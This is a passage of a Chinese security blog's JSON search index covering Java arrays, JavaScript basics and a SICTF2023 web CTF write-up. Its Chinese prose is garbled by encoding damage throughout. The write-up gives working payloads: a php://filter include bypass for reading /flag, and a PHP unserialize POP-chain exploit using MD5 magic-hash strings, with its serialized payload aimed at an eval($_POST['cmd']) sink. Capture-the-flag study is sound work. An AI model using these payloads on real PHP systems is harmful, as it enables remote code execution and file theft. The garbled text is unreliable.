JAVAæ¡ä»¶è¯­å¥\n\nsame\n\n# JAVAæ•°ç»„\n\n## å£°æ˜æ•°ç»„å˜é‡\n\nä¸¤ç§æ–¹å¼ä½†æ˜¯ä¸€èˆ¬æ¨èç¬¬ä¸€ç§æ–¹å¼ \n\n```java\ndataType[] arrayRefVar;   // é¦–é€‰çš„æ–¹æ³•\n \næˆ–\n \ndataType arrayRefVar[];  // æ•ˆæœç›¸åŒï¼Œä½†ä¸æ˜¯é¦–é€‰æ–¹æ³•\n```\n\n## åˆ›å»ºæ•°ç»„\n\n```\narrayRefVar = new dataType[arraySize];\n```\n\nåšäº†ä¸¤ä»¶äº‹æƒ…:\n\n1. é¦–å…ˆç”¨`new dataType[arraySize];`åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„\n2. ç„¶åå°†å…¶èµ‹å€¼ç»™arrayRefVar\n\nå¿…é¡»å…ˆå£°æ˜ç„¶åå†åˆ›å»º å¦‚æœä¸å£°æ˜å°±åˆ›å»ºä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694587804653-2cd473d6-a9ba-4923-b684-339087894567.png)\n\n## å®ä¾‹\n\nä¸‹æ ‡ä¾ç„¶æ˜¯ä»0å¼€å§‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694588095152-9207b9b7-b00b-411f-8b0c-4d0d4ef55b97.png)\n\n## for-eachå¾ªç¯\n\nå…¶å®å°±æ˜¯ä¹‹å‰æˆ‘ä»¬è®²è¿‡çš„å¾ªç¯ç»“æ„çš„å¢å¼ºforå¾ªç¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694588437392-1f480dd1-9035-4f8c-857d-ae7f7a8d8c3d.png)\n\n## å¤šç»´æ•°ç»„\n\n## åˆå§‹åŒ–\n\nç›´æ¥ä¸ºæ¯ä¸€ç»´åˆ†é…ç©ºé—´ è¿™ç§æˆ‘ä»¬ç”¨çš„æœ€å¤šä¹Ÿæœ€æ–¹ä¾¿\n\næˆ–è€…æ˜¯ä¸€ç»´ä¸€ç»´åˆ†é…ç©ºé—´\n\n```java\ntype[][] typeName = new type[typeLength1][typeLength2];\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694589029597-c4715464-7d86-45e2-9000-936781c25d8c.png)\n\n# JAVAæ­£åˆ™\n\nè§„åˆ™ä»€ä¹ˆçš„éƒ½å’Œå…¶ä»–è¯­è¨€å·®ä¸å¤š\n\nçœ‹ä¸ªä¾‹å­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694590443706-45f8e32f-f306-44fb-9725-86587b0b05c7.png)\n\né¦–å…ˆè¦å¼•å…¥ä¾èµ–\n\nç„¶åè¦åˆ†åˆ«åˆ›å»ºä¸¤ä¸ªç±»:Patternå’ŒMatcher\n\nPatternæ˜¯è¦è¿›è¡Œçš„åŒ¹é…æ¨¡å¼çš„å¯¹è±¡\n\nMatcheræ˜¯è¢«åŒ¹é…å†…å®¹çš„å¯¹è±¡\n\nå…¶æ¬¡è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯åœ¨javaæ­£åˆ™æ¨¡å¼ä¸­è½¬ä¹‰è¦ç”¨`//`å…¶ä»–è¯­è¨€æˆ‘ä»¬éƒ½æ˜¯åªç”¨ä¸€ä¸ª`/`\n","categories":["çŸ¥è¯†å­¦ä¹ "]},{"title":"SICTF2023 WEB WP","url":"/post/508290f8.html","content":"\nSICTF2023\n\n<!--more-->\n\né¢˜ç›®æ¢¯åº¦è®¾ç½®çš„ä¸å¤ªåˆç† ä¸¤æåˆ†åŒ–è¿‡äºä¸¥é‡åŠ›\n\n# **Include**\n\nè€ƒå¯Ÿä¼ªåè®®`php://filter/read=convert.base64-encode/resource=`\n\n# Baby_PHP\n\nè¿™ä¸ªé¢˜ å¾ˆè®©äººéš¾ç»· åŸé¢˜çš„éé¢„æœŸåœ¨è¿™é“é¢˜ç›®ä¸Šæœ‰é—®é¢˜ å‘½ä»¤æ‰§è¡Œæ²¡ç»“æœã€‚ã€‚\n\nè€ƒç‚¹:\n\n- å¥—å¨ƒä¹Ÿå°±æ˜¯æ— å‚RCE\n- phpéæ³•å‘½å\n- %0aæ¢è¡Œç»•è¿‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694165957362-b601bbd8-00b6-4c8d-8e7b-2422490aa360.png)\n\n# RCE\n\næºç :\n\n```plain\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$code = $_POST['code'];\n$code = str_replace(\"(\",\"hacker\",$code);\n$code = str_replace(\".\",\"hacker\",$code);\neval($code);\n?>\n```\n\nè¿‡æ»¤äº†æ‹¬å·å’Œç‚¹\n\nè¿™é‡Œéœ€è¦çŸ¥é“å°±æ˜¯includeå¯ä»¥ä¸ç”¨æ‹¬å·å°±èƒ½åŒ…å«æ–‡ä»¶\n\npayload:\n\n```plain\npost:code=include$_GET['x'];\nget:x=php://filter/read=convert.base64-encode/resource=/flag\n```\n\n# pain\n\njavaæ ä¸ä¼š\n\n# æˆ‘å…¨éƒ½è¦\n\næºç :\n\n```plain\n<?php\nhighlight_file(__FILE__);\n\nclass B{\n    public $pop;\n    public $i;\n    public $nogame;\n\n    public function __destruct()\n    {\n        if(preg_match(\"/233333333/\",$this->pop)){\n            echo \"è¿™æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä¸èƒ½è®©æ–°ç”Ÿä¸€ç›´åšä¸å‡ºæ¥é­å—æ‰“å‡»\";\n        }\n    }\n\n    public function game(){\n        echo \"æ‰£1é€åœ°ç‹±ç«\";\n        if ($this->i = \"1\"){\n            echo '<img src=\\'R.jpg\\'>';\n            $this->nogame->love();\n        }\n    }\n\n    public function __clone(){\n        echo \"å¿…é¡»æ‰§è¡Œ\";\n        eval($_POST[\"cmd\"]);\n    }\n}\n\n\nclass A{\n    public $Aec;\n    public $girl;\n    public $boy;\n\n    public function __toString()\n    {\n        echo \"I also want to fall in love\";\n        if($this->girl != $this->boy && md5($this->girl) == md5($this->boy)){\n            $this->Aec->game();\n        }\n    }\n\n\n}\n\n\nclass P{\n    public $MyLover;\n    public function __call($name, $arguments)\n    {\n        echo \"æœ‰å¯¹è±¡æˆ‘ä¼šåœ¨è¿™æ‰“CTF???çœ‹æˆ‘å…‹éš†ä¸€ä¸ªå¯¹è±¡ï¼\";\n        if ($name != \"game\") {\n            echo \"æ‰“æ¸¸æˆå»ï¼Œåˆ«æƒ³ç€å¯¹è±¡äº†\";\n            $this->MyLover = clone new B;\n        }\n    }\n\n\n}\n\n\nif ($_GET[\"A_B_C\"]){\n    $poc=$_GET[\"A_B_C\"];\n    unserialize($poc);\n```\n\nå…¶å®å°±ä¸€ä¸ªç‚¹ __toSting()çš„è°ƒç”¨é `preg_match(\"/233333333/\",$this->pop)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694266905359-c54e6f41-856a-42d3-b69d-68300ea81079.png)\n\nå¯ä»¥çœ‹åˆ°æ˜¯stringç±»å‹çš„ \n\nexpå¦‚ä¸‹ï¼š\n\n```plain\n<?php\nclass B{\n    public $pop;\n    public $i;\n    public $nogame;\n}\nclass A{\n    public $Aec;\n    public $girl;\n    public $boy;\n\n}\nclass P{\n    public $MyLover;\n}\n$a=new B();\n$a->pop=new A();\n$a->pop->girl= 'QNKCDZO';\n$a->pop->boy='240610708';\n$a->pop->Aec=new B();\n$a->pop->Aec->i='1';\n$a->pop->Aec->nogame=new P();\necho urlencode(serialize($a));\n?>\n#O%3A1%3A%22B%22%3A3%3A%7Bs%3A3%3A%22pop%22%3BO%3A1%3A%22A%22%3A3%3A%7Bs%3A3%3A%22Aec%22%3BO%3A1%3A%22B%22%3A3%3A%7Bs%3A3%3A%22pop%22%3BN%3Bs%3A1%3A%22i%22%3Bs%3A1%3A%221%22%3Bs%3A6%3A%22nogame%22%3BO%3A1%3A%22P%22%3A1%3A%7Bs%3A7%3A%22MyLover%22%3BN%3B%7D%7Ds%3A4%3A%22girl%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A3%3A%22boy%22%3Bs%3A9%3A%22240610708%22%3B%7Ds%3A1%3A%22i%22%3BN%3Bs%3A6%3A%22nogame%22%3BN%3B%7D\n```\n\n# DoyouknowCC\n\njava ä¼šä¸äº†ä¸€ç‚¹\n\n# ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—\n\nè€ƒç‚¹:\n\n- æ¡ä»¶ç«äº‰\n\nä¸Šä¼ å’Œè¯»å–åŒæ—¶è¿›è¡Œï¼Œçœ‹è„¸è¦ç­‰å¾ˆé•¿æ—¶é—´æ‰æˆåŠŸã€‚ã€‚ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694316396871-7e5866eb-393a-4663-90a9-7854bbfa9e84.png)\n","categories":["å„èµ›äº‹WP"]},{"title":"JSç®€å•åŸºç¡€å­¦ä¹ ","url":"/post/eb0674ad.html","content":"\nçº¯æ˜¯ä¸ºäº†çœ‹æ‡‚ä»£ç çš„...æ²¡å•¥ç”¨çš„ç”µå­åƒåœ¾\n\n<!--more-->\n\n# JSè¯­è¨€ç‰¹æ€§\n\n- jsæ˜¯ä¸€é—¨å¼±è¯­è¨€ï¼Œå£°æ˜å˜é‡æ²¡æœ‰ç±»å‹ç»Ÿä¸€ç”¨var\n- jsæ²¡æœ‰æ–¹æ³•é‡è½½æ¦‚å¿µï¼ŒåŒåå‡½æ•°ä¼šè¢«è¦†ç›–\n\n# JSä¸¤ç§å¼•å…¥æ–¹å¼\n\n- ä¸€ç§æ˜¯å†…éƒ¨ç›´æ¥å¼•å…¥å°±æ˜¯é€šè¿‡scriptæ ‡ç­¾åŒ…è£¹èµ·æ¥`<script>ä»£ç </script>`\n- å¦ä¸€ç§æ˜¯é€šè¿‡æ–‡ä»¶å¼•å…¥çš„æ–¹å¼ä¹Ÿæ˜¯é€šè¿‡scriptæ ‡ç­¾ä¸è¿‡è¦åœ¨å…¶å±æ€§åŠ ä¸Š`scr=è·¯å¾„`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>jså­¦ä¹ </title>\n  </head>\n  <body>\n    <!--å¤–éƒ¨å¼•å…¥-->\n    <script src=\"test1.js\"></script>\n    <!--å†…éƒ¨å¼•å…¥-->\n    <script>alert('hello')</script>\n  </body>\n</html>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693902331187-c021f6c2-5762-4bfe-876c-d4f8489a5c2c.png)\n\n# æ³¨é‡Šç¬¦:\n\nä¸javaä¸€ä¸€æ ·éƒ½æ˜¯`//`\n\n# å˜é‡\n\n## å®šä¹‰å˜é‡\n\n`var å˜é‡å = å€¼;` å› ä¸ºæ˜¯å¼±ç±»å‹è¯­è¨€\n\né™¤äº†varä¹‹å¤–è¿˜æœ‰let const ä¸‰è€…åŒºåˆ«:\n\n- varå£°æ˜æ˜¯å…¨å±€ä½œç”¨åŸŸæˆ–å‡½æ•°ä½œç”¨åŸŸï¼Œè€Œletå’Œconstæ˜¯å—ä½œç”¨åŸŸã€‚\n- varå˜é‡å¯ä»¥åœ¨å…¶èŒƒå›´å†…æ›´æ–°å’Œé‡æ–°å£°æ˜ï¼› letå˜é‡å¯ä»¥è¢«æ›´æ–°ä½†ä¸èƒ½é‡æ–°å£°æ˜ï¼› constå˜é‡æ—¢ä¸èƒ½æ›´æ–°ä¹Ÿä¸èƒ½é‡æ–°å£°æ˜ã€‚\n- å®ƒä»¬éƒ½è¢«æå‡åˆ°å…¶ä½œç”¨åŸŸçš„é¡¶ç«¯ã€‚ä½†æ˜¯ï¼Œè™½ç„¶ä½¿ç”¨å˜é‡undefinedåˆå§‹åŒ–äº†varå˜é‡ï¼Œä½†æœªåˆå§‹åŒ–letå’Œconstå˜é‡ã€‚\n- å°½ç®¡å¯ä»¥åœ¨ä¸åˆå§‹åŒ–çš„æƒ…å†µä¸‹å£°æ˜varå’Œletï¼Œä½†æ˜¯åœ¨å£°æ˜æœŸé—´å¿…é¡»åˆå§‹åŒ–constã€‚\n\næ¥è‡ª:[JavaScript ä¸­çš„ Varã€Let å’Œ Const æœ‰ä»€ä¹ˆåŒºåˆ«](https://www.freecodecamp.org/chinese/news/javascript-var-let-and-const/)\n\nä½¿ç”¨äº† var å…³é”®å­—ï¼Œå®ƒå£°æ˜çš„å˜é‡æ˜¯å…¨å±€çš„ï¼ŒåŒ…æ‹¬å¾ªç¯ä½“å†…ä¸å¾ªç¯ä½“å¤–\n\nä½¿ç”¨ let å…³é”®å­—ï¼Œ å®ƒå£°æ˜çš„å˜é‡ä½œç”¨åŸŸåªåœ¨å¾ªç¯ä½“å†…ï¼Œå¾ªç¯ä½“å¤–çš„å˜é‡ä¸å—å½±å“\n\nå°±æ˜¯è¯´å¦‚æœåœ¨å¾ªç¯ä½“å¤–å’Œå†…éƒ½å®šä¹‰ç›¸åŒå˜é‡\n\né‚£ä¹ˆvarä¸ç®¡åœ¨ä½“å†…è¿˜æ˜¯ä½“å¤–éƒ½ä¼šæ”¹å˜å˜é‡å€¼ï¼Œè€Œletä½“å¤–çš„å˜é‡å€¼ä¸å—ä½“å†…çš„æ”¹å˜è€Œå˜åŒ–\n\n let å…³é”®å­—å£°æ˜çš„å…¨å±€ä½œç”¨åŸŸå˜é‡ä¸å±äº window å¯¹è±¡\n\n## æœªå®šä¹‰undefined\n\nundefinedç±»å‹åªæœ‰ä¸€ä¸ªå€¼å°±æ˜¯undefined\n\n`var a;`å£°æ˜ä½†æ˜¯æ²¡æœ‰ç»™å€¼é‚£ä¹ˆå°±æ˜¯undefined\n\n## æ•°å­—number\n\næ•°å­—ç±»å‹çš„æ‰€æœ‰çš„æ•°å­—å‡ç”¨æµ®ç‚¹æ•°å€¼è¡¨ç¤º(ä¸åŒºåˆ†æ•´æ•°å€¼å’Œæµ®ç‚¹å€¼,å°æ•°ç‚¹å¯å¸¦å¯ä¸å¸¦)ã€‚\nç‰¹æ®Šçš„æ•°å­—ç±»å‹NaN:\nNaN ä»£è¡¨éæ•°å­—çš„ç‰¹æ®Šå€¼,ç”¨äºæŒ‡ç¤ºæŸä¸ªå€¼ä¸æ˜¯æ•°å­—ã€‚\nNaN éæ•°å­—ä¸ä»»ä½•æ•°æ®éƒ½ä¸ç›¸ç­‰ï¼ŒåŒ…æ‹¬è‡ªå·±ã€‚\njså†…ç½®å‡½æ•°isNaN(),åˆ¤æ–­æ•°å€¼ä¸æ˜¯æ•°å­—ã€‚\n`isNaN(123) //false`\n`isNaN(â€œabcâ€) //true`\n\n## å­—ç¬¦ä¸²string\n\nç”¨åŒå¼•å·æˆ–è€…å•å¼•å·åŒ…è£¹å³å¯\n\nå¯ä»¥ç”¨ç´¢å¼•ä½ç½®æ¥è®¿é—®å…¶ä¸­çš„æ¯ä¸ªå­—ç¬¦\n\nå†…ç½®å±æ€§lengthå¯ä»¥ç”¨æ¥è®¡ç®—é•¿åº¦ æ¯”å¦‚`string.length`\n\nå­—ç¬¦ä¸²ä¸­åŒ…å«å•åŒå¼•å·æ—¶ï¼Œå°±éœ€è¦è½¬ä¹‰ä¸€ä¸‹ï¼Œä¸ç„¶æ— æ³•è§£æ\n\n## å­—ç¬¦ä¸²è¿˜å¯ä»¥æ˜¯å¯¹è±¡\n\n new å…³é”®å­—å°†å­—ç¬¦ä¸²å®šä¹‰ä¸ºä¸€ä¸ªå¯¹è±¡\n\n```plain\nvar x = \"John\";\nvar y = new String(\"John\");\ntypeof x // è¿”å› String\ntypeof y // è¿”å› Object\n```\n\nå½“ç„¶Stringå¯¹è±¡æœ€å¥½åˆ«ç”¨ï¼Œä¼šæ‹–æ…¢æ‰§è¡Œé€Ÿåº¦ä»¥åŠå…¶ä»–å‰¯ä½œç”¨\n\n## å¸ƒå°” boolean\n\nè¡¨ç¤ºçœŸæˆ–è€…å‡ åªæœ‰ä¸¤ä¸ªå€¼å°±æ˜¯trueå’Œfalse\n\n## å¯¹è±¡ object\n\nå¯¹è±¡ï¼šæ˜¯æ‹¥æœ‰å±æ€§å’Œæ–¹æ³•çš„æ•°æ®\nè¯­æ³•ï¼š\nvar å¯¹è±¡å = `{å±æ€§åï¼šå±æ€§å€¼ï¼Œå±æ€§åï¼šå±æ€§å€¼ï¼Œâ€¦}`\nå¯¹è±¡çš„å±æ€§å¯»å€ï¼š\nå¯¹è±¡å±æ€§æœ‰ä¸¤ç§å¯»å€æ–¹å¼ä¹Ÿå°±æ˜¯å¼•ç”¨æ–¹å¼ï¼š\n`people.name;`\n`people[â€œnameâ€];`\n\n## å¸¸é‡:\n\n`const AGE=18;` //å®šä¹‰å¸¸é‡\nå¸¸é‡åç§°å¸¸ç”¨å¤§å†™å­—ç¬¦\nå¸¸é‡ä¸èƒ½èµ‹å€¼æ”¹å˜ï¼Œå¦åˆ™ä¼šæŠ¥é”™\n\n## JSå­—é¢é‡(ç›´æ¥é‡)\n\n**ç”¨æ¥ä¸ºå˜é‡èµ‹å€¼æ—¶çš„å¸¸æ•°é‡**\nå­—é¢é‡æ˜¯æŒ‡ç¨‹åºä¸­ç›´æ¥æ˜¾ç¤ºå‡ºæ¥çš„å€¼ã€‚\n100 //æ•°å­—å­—é¢é‡\n'hello world' //å­—ç¬¦ä¸²å­—é¢é‡\nfalse //å¸ƒå°”å­—é¢é‡\n`{x:1, y:2}` //å¯¹è±¡å­—é¢é‡è¡¨è¾¾å¼\n`[1,2,3,4,5]` //æ•°ç»„å­—é¢é‡è¡¨è¾¾å¼\n\n## jsæ¨¡æ¿å­—ç¬¦ä¸²\n\nè¿™é‡Œå°±å¯ä»¥ç†è§£ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694323114599-a0e388c2-4053-4e8c-a00b-0c99c107f1f6.png)\n\nå¯ä»¥å°†`${}`ä¸­å˜é‡çš„å€¼å¸¦è¿›å»ä¸€èµ·è§£æ\n\n## å˜é‡çš„ä½¿ç”¨è§„åˆ™\n\n- å˜é‡å£°æ˜äº†æ²¡æœ‰èµ‹å€¼ï¼Œå˜é‡çš„å€¼å°±æ˜¯undefinedç±»å‹\n- å˜é‡æ²¡æœ‰å£°æ˜ç›´æ¥ä½¿ç”¨ï¼Œè¿è¡Œæ—¶ä¼šæŠ¥é”™\n\n# Typeof\n\nç”¨æ¥ç›‘æµ‹æ•°æ®(å˜é‡æˆ–è€…å€¼)çš„æ•°æ®ç±»å‹ \n\nè¯­æ³•ï¼štypeof å€¼\n\nå¯ä»¥ç†è§£ä¸ºphpä¸­çš„var_dump()å‡½æ•°\n\n1. \"undefined\"â€”â€”å¦‚æœè¿™ä¸ªå€¼æœªå®šä¹‰ï¼›\n2. \"boolean\"â€”â€”å¦‚æœè¿™ä¸ªå€¼æ˜¯å¸ƒå°”å€¼ï¼›\n3. \"string\"â€”â€”å¦‚æœè¿™ä¸ªå€¼æ˜¯å­—ç¬¦ä¸²ï¼›\n4. \"number\"â€”â€”å¦‚æœè¿™ä¸ªå€¼æ˜¯æ•°å€¼ï¼›\n5. \"object\"â€”â€”å¦‚æœè¿™ä¸ªå€¼æ˜¯å¯¹è±¡æˆ–nullï¼›\n6. \"function\"â€”â€”å¦‚æœè¿™ä¸ªå€¼æ˜¯å‡½æ•°(å‡½æ•°æ˜¯å¯¹è±¡ï¼Œä¸æ˜¯ä¸€ç§æ•°æ®ç±»å‹ã€‚ç„¶è€Œï¼Œå‡½æ•°å› ä¸ºæœ‰ä¸€äº›ç‰¹æ®Šçš„å±æ€§ï¼Œå› æ­¤é€šè¿‡typeofæ“ä½œç¬¦æ¥åŒºåˆ†å‡½æ•°å’Œå…¶ä»–å¯¹è±¡)\n\n# è¿ç®—ç¬¦\n\n## 1ã€ç®—æœ¯è¿ç®—ç¬¦æ˜¯ç”¨æ¥æ‰§è¡Œå˜é‡æˆ–å€¼çš„ç®—æœ¯è¿ç®—\n\n++ è‡ªå¢ï¼š x++; //ç›¸å½“äºx=x+1\nâ€” è‡ªå‡ï¼š xâ€”;//ç›¸å½“äºx=x-1\nè‡ªå¢æˆ–è‡ªå‡çš„è¿ç®—ç¬¦çš„ä½ç½®ä¸åŒï¼Œæ„ä¹‰ä¸åŒ\n\n## 2ã€èµ‹å€¼è¿ç®—ç¬¦æ˜¯ç”¨æ¥ç»™å˜é‡èµ‹å€¼\n\n```\nvar num=123;\n```\n\n## 3ã€å­—ç¬¦ä¸²è¿æ¥ç¬¦\n\nå®ä¾‹1ï¼šå­—ç¬¦ä¸²é—´çš„ + è¿ç®—ç¬¦\nå­—ç¬¦ä¸²é—´çš„ + è¿ç®—ç¬¦å¯ä»¥æŠŠä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²å˜é‡è¿æ¥èµ·æ¥ã€‚\nå®ä¾‹2ï¼šå¯¹å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡ŒåŠ æ³•è¿ç®—è¿”å›å­—ç¬¦ä¸²ã€‚\n\n## 4ã€æ¯”è¾ƒè¿ç®—ç¬¦\n\næ¯”è¾ƒè¿ç®—ç¬¦ç”¨æ¥æµ‹å®šå˜é‡æˆ–å€¼æ˜¯å¦ç›¸ç­‰ã€‚\nè¿”å›å€¼ä¸ºtrueæˆ–false\n\n`console.log(null==undefined); //true`\n`console.log(null===undefined); //false`\n==åˆ¤æ–­å€¼æ˜¯å¦ç›¸ç­‰ï¼›\n===åˆ¤æ–­å€¼å’Œæ•°æ®ç±»å‹æ˜¯å¦éƒ½ç›¸ç­‰ï¼›\n\nè¿™ä¸€ç‚¹å’Œphpçš„å¼±æ¯”è¾ƒå’Œå¼ºæ¯”è¾ƒæœ‰ç‚¹åƒ\n\n`console.log(isNaN(undefined));// true NaN`\n`console.log(isNaN(null));// false 0`\nnullæ˜¯ä¸€ä¸ªè¡¨ç¤ºâ€ç©ºâ€çš„å¯¹è±¡ï¼Œè½¬ä¸ºæ•°å€¼æ—¶ä¸º0ï¼›\nundefinedæ˜¯ä¸€ä¸ªè¡¨ç¤ºâ€ç©ºâ€çš„åŸå§‹å€¼ï¼Œè½¬ä¸ºæ•°å€¼æ—¶ä¸ºNaNã€‚\n\nç‰¹æ®Šçš„æ•°å­—ç±»å‹NaNï¼Œç”¨äºæŒ‡ç¤ºæŸä¸ªå€¼ä¸æ˜¯æ•°å­—ã€‚\nNaN éæ•°å­—ä¸ä»»ä½•æ•°æ®éƒ½ä¸ç›¸ç­‰ï¼ŒåŒ…æ‹¬è‡ªå·±ã€‚\n\n```plain\nNaN==NaN    //false\nNaN!=NaN    //true\n5 == NaN    //false\n\"5\"==NaN    //false\n```\n\nåœ¨jsåšæ¯”è¾ƒçš„æ—¶å€™ï¼Œæœ‰è¿™æ ·çš„ä¸‰æ¡è§„åˆ™ï¼š\nå¦‚æœæ¯”è¾ƒçš„ä¸¤è€…ä¸­æœ‰boolï¼Œä¼šæŠŠ bool å…ˆè½¬æ¢ä¸ºå¯¹åº”çš„ numberï¼Œå³ 0 å’Œ 1\nå¦‚æœæ¯”è¾ƒçš„åŒæ–¹ä¸­æœ‰ä¸€æ–¹ä¸ºnumberä¸€æ–¹ä¸ºstringï¼Œä¼šæŠŠstringè½¬æ¢ä¸ºæ•°å­—\næŠŠstringç›´æ¥è½¬æ¢ä¸ºboolçš„æ—¶å€™ï¼Œç©ºå­—ç¬¦ä¸²`''`è½¬æ¢ä¸º falseï¼Œé™¤æ­¤å¤–çš„ä¸€åˆ‡å­—ç¬¦ä¸²è½¬æ¢ ä¸º true æ€»ç»“:å…ˆè½¬bool,å†è½¬string\n\n# é€»è¾‘è¿ç®—ç¬¦\n\né€»è¾‘è¿ç®—ç¬¦ç”¨æ¥æµ‹å®šå˜é‡å’Œå€¼ä¸­çš„é€»è¾‘ã€‚\né€»è¾‘ä¸&&ï¼ˆæ‰¾å‡ï¼‰\né€»è¾‘æˆ–||ï¼ˆæ‰¾çœŸï¼‰\né€»è¾‘é!\nè¿”å›å€¼ä¸ºtrueæˆ–false\n\n# JSçš„ä¸‰ä¸ªå†…ç½®å‡½æ•°\n\n- è­¦å‘Šæ¡†:alert(\"å†…å®¹\")\n- ç¡®è®¤æ¡†:confirm(\"å†…å®¹\")\n- åœ¨æ§åˆ¶å°æ‰“å°æ—¥å¿—:console.log(\"æ—¥å¿—å†…å®¹\")\n\n# JSåˆ›å»ºå¯¹è±¡çš„ä¸¤ç§æ–¹å¼\n\n- ä½¿ç”¨newå…³é”®å­—åˆ›å»ºå¯¹è±¡\n- ä½¿ç”¨`{}`åˆ›å»ºå¯¹è±¡\n\n```html\n//ä½¿ç”¨newå…³é”®å­—åˆ›å»ºå¯¹è±¡\nvar obj01=new Object();\nobj01.name=\"jack\";\nobj01.age=100;\nobj01.address=\"china\";\nobj01.showMessage=function(){\n    console.log(obj01);\n}\n//ä½¿ç”¨{}åˆ›å»ºå¯¹è±¡\nvar obj02={\n    \"name\":\"jack\",\n    \"age\":20,\n    \"address\":\"china\",\n    \"showMessage\":function(message){\n        console.log(message);\n    }\n};\n```\n\n# åˆ›å»ºæ•°ç»„\n\n- ä½¿ç”¨newå…³é”®å­—åˆ›å»ºæ•°ç»„ï¼š`var arr = new Array();`æ„Ÿè§‰åƒæ˜¯phpå†…ç½®ç±» æœ‰æœ¨æœ‰ï¼Ÿï¼Ÿ\n- ä½¿ç”¨`[]`åˆ›å»ºæ•°ç»„: `var arr = [\"cat\",\"dog\"];`\n\n## æ•°ç»„å¸¸ç”¨æ–¹æ³•\n\n- å‹å…¥æ•°æ®ï¼š`arr01.push(â€œappleâ€);`\n- æ•°ç»„å…ƒç´ åè½¬ï¼š`arr01.reverse( );`\n- æŠŠæ•°ç»„å…ƒç´ é€šè¿‡æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼Œæ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼š`var arrStr = arr01.join(â€œ,â€);`\n- æŠŠå­—ç¬¦ä¸²é€šè¿‡æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼Œæ‹†åˆ†æˆæ•°ç»„ï¼š`var arr02 = arrStr.split(â€œ,â€);`\n- å¼¹å‡ºæ•°ç»„ä¸­æœ€åä¸€ä¸ªå…ƒç´  ï¼šå°†æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ç§»é™¤ï¼Œå¹¶è¿”å›ï¼š`var ele = arr01.pop( );`\n- éå†æ•°ç»„ï¼š`for (var i = 0; i < arr01.length; i++) { console.log(arr01[i]); }`\n\n# thiså…³é”®å­—\n\n- åœ¨å‡½æ•°å¤–é¢ï¼šthiså…³é”®å­—æŒ‡å‘windowå¯¹è±¡ä¹Ÿå°±æ˜¯ä»£è¡¨å½“å‰æµè§ˆå™¨çª—å£\n- åœ¨å‡½æ•°é‡Œé¢ï¼šthiså…³é”®å­—æŒ‡å‘è°ƒç”¨å‡½æ•°çš„å¯¹è±¡\n\nä¼šéšç€æ‰§è¡Œç¯å¢ƒè€Œæ”¹å˜ï¼š\n\n- åœ¨æ–¹æ³•ä¸­ï¼Œthis è¡¨ç¤ºè¯¥æ–¹æ³•æ‰€å±çš„å¯¹è±¡ã€‚\n- å¦‚æœå•ç‹¬ä½¿ç”¨ï¼Œthis è¡¨ç¤ºå…¨å±€å¯¹è±¡ã€‚\n- åœ¨å‡½æ•°ä¸­ï¼Œthis è¡¨ç¤ºå…¨å±€å¯¹è±¡ã€‚\n- åœ¨å‡½æ•°ä¸­ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œthis æ˜¯æœªå®šä¹‰çš„(undefined)ã€‚\n- åœ¨äº‹ä»¶ä¸­ï¼Œthis è¡¨ç¤ºæ¥æ”¶äº‹ä»¶çš„å…ƒç´ ã€‚\n- ç±»ä¼¼ call() å’Œ apply() æ–¹æ³•å¯ä»¥å°† this å¼•ç”¨åˆ°ä»»ä½•å¯¹è±¡\n\n# æ¡ä»¶è¯­å¥\n\nå’Œå…¶ä»–è¯­è¨€å·®ä¸å¤š\n\nè¯­æ³•ï¼š\n\n```plain\nç¬¬ä¸€ç§\nif (condition)\n{\n    å½“æ¡ä»¶ä¸º true æ—¶æ‰§è¡Œçš„ä»£ç \n}\nç¬¬äºŒç§\nif (condition)\n{\n    å½“æ¡ä»¶ä¸º true æ—¶æ‰§è¡Œçš„ä»£ç \n}\nelse\n{\n    å½“æ¡ä»¶ä¸ä¸º true æ—¶æ‰§è¡Œçš„ä»£ç \n}\nç¬¬ä¸‰ç§\nif (condition1)\n{\n    å½“æ¡ä»¶ 1 ä¸º true æ—¶æ‰§è¡Œçš„ä»£ç \n}\nelse if (condition2)\n{\n    å½“æ¡ä»¶ 2 ä¸º true æ—¶æ‰§è¡Œçš„ä»£ç \n}\nelse\n{\n  å½“æ¡ä»¶ 1 å’Œ æ¡ä»¶ 2 éƒ½ä¸ä¸º true æ—¶æ‰§è¡Œçš„ä»£ç \n}\n```\n\n# SWITCHè¯­å¥\n\nä¹Ÿå’Œå…¶ä»–è¯­è¨€ä¸€æ · æ¡ä»¶ç­‰äºç›¸åº”çš„å€¼æ—¶ æ‰§è¡Œè¯­å¥\n\nè¯­æ³•ï¼š\n\n```plain\nswitch(n)\n{\n    case 1:\n        æ‰§è¡Œä»£ç å— 1\n        break;\n    case 2:\n        æ‰§è¡Œä»£ç å— 2\n        break;\n    default:\n        ä¸ case 1 å’Œ case 2 ä¸åŒæ—¶æ‰§è¡Œçš„ä»£ç 